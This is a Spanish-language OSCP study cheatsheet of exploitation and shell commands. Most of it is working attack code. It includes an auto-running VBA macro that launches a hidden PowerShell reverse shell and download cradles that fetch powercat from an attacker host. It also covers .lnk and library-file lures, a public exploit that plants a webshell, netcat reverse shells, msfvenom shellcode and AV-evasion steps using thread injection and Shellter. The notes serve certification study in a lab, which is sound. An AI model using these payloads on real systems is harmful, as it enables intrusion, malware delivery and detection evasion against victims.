---
tipo: cheatsheet
tags: [oscp, cheatsheet]
---

# Cheatsheet: Explotacion y Shells

> [!info] Comandos añadidos a medida que avanzo en los módulos.

## Client-side attacks

### RDP a la víctima (para preparar el ataque)
```bash
xfreerdp /u:offsec /p:lab /v:192.168.50.194   # NLA fuera de dominio (rdesktop no vale en Win11)
```

### Macro VBA en Word (reverse shell)
```python
# Trocear el comando base64 en strings <255 chars para VBA
str = "powershell.exe -nop -w hidden -enc SQBFAFgA..."
n = 50
for i in range(0, len(str), n):
    print("Str = Str + " + '"' + str[i:i+n] + '"')
```
```vba
Sub AutoOpen()
    MyMacro
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub MyMacro()
    Dim Str As String
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
    ' ...resto de chunks...
    CreateObject("Wscript.Shell").Run Str
End Sub
```
Guardar como `.doc`/`.docm` (nunca `.docx`). Ver [[Macros VBA Maliciosas (Office)]].

### Download cradle + PowerCat (payload reutilizable)
```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://KALI/powercat.ps1');powercat -c KALI -p 4444 -e powershell
```

### WebDAV con WsgiDAV (etapa 1 de library files)
```bash
sudo apt install python3-wsgidav
mkdir /home/kali/webdav && touch /home/kali/webdav/test.txt
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

### Windows library file + shortcut (.Library-ms / .lnk)
```bash
smbclient //192.168.50.195/share -c 'put config.Library-ms'   # simular entrega por SMB
```
```powershell
# Destino del .lnk (etapa 2):
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://KALI:8000/powercat.ps1');powercat -c KALI -p 4444 -e powershell"
```
XML del `.Library-ms` y detalles en [[Windows Library Files (.Library-ms)]].

### Listeners / servidores de apoyo (Kali)
```bash
python3 -m http.server 8000    # servir powercat.ps1
nc -nvlp 4444                  # listener de la reverse shell
```

## Exploits públicos → webshell → reverse shell (ver [[13 - Locating Public Exploits]])

### Ejecutar exploit auth (ej. qdPM 9.1 RCE, EDB 50944)
```bash
searchsploit -m 50944                                                    # copiar exploit al CWD
python3 50944.py -url http://192.168.50.11/project/ -u george@AIDevCorp.org -p AIDevCorp
# -> sube webshell en .../uploads/users/<n>-backdoor.php?cmd=
```

### Usar un webshell con curl
```bash
curl "http://TARGET/.../backdoor.php?cmd=whoami"                         # RCE simple
curl http://TARGET/.../backdoor.php --data-urlencode "cmd=which nc"      # URL-encode comandos con espacios
```

### Reverse shell desde el webshell
```bash
nc -lvnp 6666                                                            # listener en Kali
curl http://TARGET/.../backdoor.php --data-urlencode "cmd=nc -nv KALI 6666 -e /bin/bash"
```

### Payload Windows (msfvenom — se ve en módulo posterior)
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > reverse.exe
```

## Fixing / adaptar exploits públicos (ver [[14 - Fixing Exploits]])

### Cross-compilar un exploit de Windows desde Kali (ver [[Cross-Compiling con mingw-w64]])
```bash
sudo apt install mingw-w64
i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32   # x86 + winsock (-lws2_32 arregla undefined reference)
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32 # x64
sudo wine exploit.exe                                    # ejecutar el PE desde Kali
```

### Shellcode para pegar en C (msfvenom con bad chars)
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=443 EXITFUNC=thread \
    -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
# -f c -> unsigned char buf[] ;  -b -> bad characters a excluir
```

### Arreglar exploit web en Python (requests)
```python
# ignorar certificado self-signed en CADA request
requests.post(url, data=data, verify=False)
```
```bash
curl -k "https://TARGET/uploads/shell.php?cmd=whoami"    # -k ignora cert self-signed
```
Debug de errores: `print` de la variable justo antes de la línea que peta (p.ej. un parámetro CSRF que cambió entre versiones: `__c` → `_sk_`).

## Antivirus evasion (ver [[15 - Antivirus Evasion]])

### Medir detección de un payload
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=443 -f exe > binary.exe   # PE crudo (muy detectado)
xxd -b file          # dump binario  |  sha256sum file   # hash (1 bit cambia -> hash distinto)
```
> OPSEC: VirusTotal **comparte** la muestra con los vendors. Usa Kleenscan o una VM espejo; desactiva *Automatic Sample Submission* de Defender.

### Bypass manual: thread injection con PowerShell (ver [[Evasion AV con PowerShell (Thread Injection)]])
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=443 -f psh-reflection     # shellcode para la plantilla PS
```
```powershell
# plantilla: VirtualAlloc + CreateThread + memset + <shellcode>  -> bypass.ps1  (ejecutar en PowerShell x86)
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser             # saltar policy (per-user)
powershell -ExecutionPolicy Bypass -File .\bypass.ps1                            # o solo esta ejecución
```

### Bypass automático: Shellter (PE infector, ver [[Shellter]])
```bash
sudo apt install shellter wine
sudo dpkg --add-architecture i386 && apt-get update && apt-get install wine32
shellter        # Auto (A) -> PE target -> Stealth (Y) -> payload Meterpreter -> LHOST/LPORT
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <IP>;set LPORT 443;run;"
```

